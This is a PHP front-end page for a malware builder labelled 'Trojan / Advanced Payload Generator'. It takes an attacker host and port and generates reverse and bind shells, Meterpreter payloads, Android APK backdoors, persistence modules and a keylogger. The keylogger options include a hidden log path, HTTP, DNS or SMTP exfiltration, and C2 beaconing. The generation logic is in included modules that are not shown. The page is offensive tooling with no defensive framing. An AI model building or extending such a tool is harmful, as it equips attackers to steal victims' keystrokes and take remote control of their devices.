<?php
/**
 * Trojan / Advanced Payload Generator Dashboard v4.0
 * Supports Keylogger backdoor generation for all OS.
 */

$advanced_mode = isset($_GET['advanced']) ? true : false;
$preset_type   = $_GET['type'] ?? '';

if ($advanced_mode) {
    if (file_exists(__DIR__ . '/../system/modules/AdvancedPayloadModule.php')) {
        require_once __DIR__ . '/../system/modules/AdvancedPayloadModule.php';
        if (class_exists('AdvancedPayloadModule')) {
            $payload_module = new AdvancedPayloadModule();
            $module_name = 'AdvancedPayloadModule v4.0';
            $is_advanced = true;
        } else {
            die('<div style="background:#0a0a0a; color:#ff0000; padding:20px;">ERROR: AdvancedPayloadModule class not found.</div>');
        }
    } else {
        die('<div style="background:#0a0a0a; color:#ff0000; padding:20px;">ERROR: AdvancedPayloadModule.php not found.</div>');
    }
} else {
    require_once __DIR__ . '/includes/EnhancedModuleLoader.php';
    $loader = EnhancedModuleLoader::getInstance();
    if ($loader->isAvailable()) {
        if (file_exists(__DIR__ . '/../system/modules/TrojanModule.php')) {
            require_once __DIR__ . '/../system/modules/TrojanModule.php';
            $payload_module = new EnhancedTrojanModule();
            $module_name = 'EnhancedTrojanModule v2.0';
            $is_advanced = false;
        } else {
            die('TrojanModule.php not found.');
        }
    } else {
        die('Trojan module not available: ' . $loader->getError());
    }
}

// Handle form submission
$generated = null;
$error = null;
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['generate'])) {
    $cfg = [
        'type'     => $_POST['type'] ?? ($is_advanced ? 'meterpreter_reverse_tcp' : 'reverse_shell'),
        'platform' => $_POST['platform'] ?? 'linux',
        'format'   => $_POST['format'] ?? 'sh',
        'lhost'    => $_POST['lhost'] ?? '127.0.0.1',
        'lport'    => (int)($_POST['lport'] ?? 4444),
        'extra'    => [
            'exfil_method' => $_POST['exfil_method'] ?? 'http',
            'log_path'     => $_POST['log_path'] ?? '/tmp/.keys.log',
            'interval'     => (int)($_POST['interval'] ?? 60)
        ]
    ];
    try {
        $generated = $payload_module->generate_payload($cfg);
    } catch (Exception $e) {
        $error = $e->getMessage();
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title><?php echo $advanced_mode ? '🧬 Advanced Payload Generator v4.0' : '🏴‍☠️ Trojan Generator'; ?></title>
    <style>
        body { background:#0a0a0a; color:#00ff00; font-family:'Courier New',monospace; padding:20px; }
        .container { max-width:800px; margin:0 auto; }
        h1 { color:#00ffff; border-bottom:2px solid #00ffff; padding-bottom:10px; }
        .info { background:rgba(0,255,0,0.1); border:1px solid #00ff00; padding:15px; margin:20px 0; border-radius:5px; }
        .form-group { margin-bottom:15px; }
        label { display:block; color:#00ffff; margin-bottom:5px; }
        input, select, textarea { width:100%; padding:8px; background:#000; color:#00ff00; border:1px solid #00ff00; border-radius:4px; }
        button { background:#000; color:#00ff00; border:2px solid #00ff00; padding:10px 20px; cursor:pointer; font-size:16px; transition:0.3s; }
        button:hover { background:#00ff00; color:#000; }
        .result { background:rgba(0,0,0,0.9); border:2px solid #00ffff; padding:15px; margin-top:30px; border-radius:5px; }
        .error { color:#ff0000; border-color:#ff0000; }
        a { color:#00ffff; text-decoration:none; }
        a:hover { text-decoration:underline; }
    </style>
</head>
<body class="cosmic-scroll-body">
    <div class="container">
        <h1><?php echo $advanced_mode ? '🧬 Advanced Payload Generator v4.0' : '🏴‍☠️ Trojan Generator v2.0'; ?></h1>
        <div class="info">
            <strong>Module:</strong> <?php echo $module_name; ?><br>
            <strong>Mode:</strong> <?php echo $advanced_mode ? 'Keylogger / Meterpreter / APK' : 'Standard'; ?>
        </div>

        <form method="post">
            <?php if ($advanced_mode): ?>
            <div class="form-group">
                <label>🧠 C2 Integration:</label>
                <label style="display:inline; margin-left:10px;">
                    <input type="checkbox" name="c2_enabled" value="1" checked> Enable C2 beaconing
                </label>
                <small style="display:block; color:#888;">Payload will phone home to /c2/beacon.php?uuid=...</small>
            </div>
            <?php endif; ?>
            <div class="form-group">
                <label>LHOST (attacker IP / domain):</label>
                <input type="text" name="lhost" placeholder="192.168.1.100" value="<?php echo htmlspecialchars($_POST['lhost'] ?? ''); ?>">
            </div>
            <div class="form-group">
                <label>LPORT:</label>
                <input type="number" name="lport" placeholder="4444" value="<?php echo htmlspecialchars($_POST['lport'] ?? '4444'); ?>">
            </div>
            <div class="form-group">
                <label>Payload Type:</label>
                <select name="type">
                    <?php if ($advanced_mode): ?>
                        <option value="meterpreter_reverse_tcp" <?php echo $preset_type==='meterpreter'?'selected':''; ?>>Meterpreter Reverse TCP</option>
                        <option value="android_backdoor_full"   <?php echo $preset_type==='android'?'selected':''; ?>>Android APK Backdoor</option>
                        <option value="persistence"            <?php echo $preset_type==='persistence'?'selected':''; ?>>Persistence Module</option>
                        <option value="keylogger"              <?php echo ($preset_type==='keylogger'||$preset_type==='')?'selected':''; ?>>Cross‑Platform Keylogger</option>
                    <?php else: ?>
                        <option value="reverse_shell">Reverse Shell</option>
                        <option value="bind_shell">Bind Shell</option>
                    <?php endif; ?>
                </select>
            </div>
            <div class="form-group">
                <label>Platform:</label>
                <select name="platform">
                    <option value="linux">Linux</option>
                    <option value="windows">Windows</option>
                    <?php if ($advanced_mode): ?>
                    <option value="macos">macOS</option>
                    <option value="android">Android</option>
                    <?php endif; ?>
                </select>
            </div>
            <div class="form-group">
                <label>Format / Language:</label>
                <select name="format">
                    <option value="sh">Shell Script (.sh)</option>
                    <option value="py">Python (.py)</option>
                    <option value="ps1">PowerShell (.ps1)</option>
                    <?php if ($advanced_mode): ?>
                    <option value="vbs">VBScript (.vbs)</option>
                    <option value="applescript">AppleScript (.applescript)</option>
                    <option value="apk">Android APK (.apk)</option>
                    <?php endif; ?>
                </select>
            </div>
            <?php if ($advanced_mode && isset($_POST['type']) && $_POST['type'] === 'keylogger'): ?>
            <div class="form-group">
                <label>Exfiltration Method:</label>
                <select name="exfil_method">
                    <option value="http">HTTP POST</option>
                    <option value="dns">DNS (simulated)</option>
                    <option value="smtp">SMTP</option>
                </select>
            </div>
            <div class="form-group">
                <label>Log File Path (on target):</label>
                <input type="text" name="log_path" value="/tmp/.keys.log">
            </div>
            <div class="form-group">
                <label>Upload Interval (seconds):</label>
                <input type="number" name="interval" value="60" min="1">
            </div>
            <?php endif; ?>
            <button type="submit" name="generate">🚀 Generate Payload</button>
        </form>

        <?php if ($error): ?>
        <div class="result" style="border-color:#ff0000;">
            <h3 style="color:#ff0000;">❌ Generation Failed</h3>
            <pre><?php echo htmlspecialchars($error); ?></pre>
        </div>
        <?php endif; ?>

        <?php if ($generated): ?>
        <div class="result">
            <h3 style="color:#00ff00;">✅ Payload Generated Successfully</h3>
            <p><strong>Filename:</strong> <?php echo htmlspecialchars($generated['filename']); ?></p>
            <p><strong>Path:</strong> <?php echo htmlspecialchars($generated['path']); ?></p>
            <p><strong>Size:</strong> <?php echo $generated['size']; ?> bytes</p>
            <p><strong>SHA256:</strong> <code style="background:#000; color:#0ff;"><?php echo $generated['hash']['sha256']; ?></code></p>
            <p style="margin-top:15px;">
                <a href="<?php echo $generated['download_url']; ?>" style="display:inline-block; background:#00ff00; color:#000; padding:8px 20px; border-radius:5px; text-decoration:none; font-weight:bold; border:1px solid #0ff;">💾 Download Payload</a>
            </p>
            <?php if (isset($generated['warning'])): ?>
            <p style="color:#ffff00;"><strong>Warning:</strong> <?php echo htmlspecialchars($generated['warning']); ?></p>
            <?php endif; ?>
            <div style="margin-top:20px;">
                <a href="cosmic-unified-dashboard.php">← Back to Dashboard</a>
                <?php if ($advanced_mode && $payload_module->is_msfvenom_ready()): ?>
                <a href="#" onclick="alert('Listener RC generation available via API.')" style="margin-left:20px;">🎯 Generate Listener RC</a>
                <?php endif; ?>
            </div>
        </div>
        <?php endif; ?>
    </div>
</body>
</html>
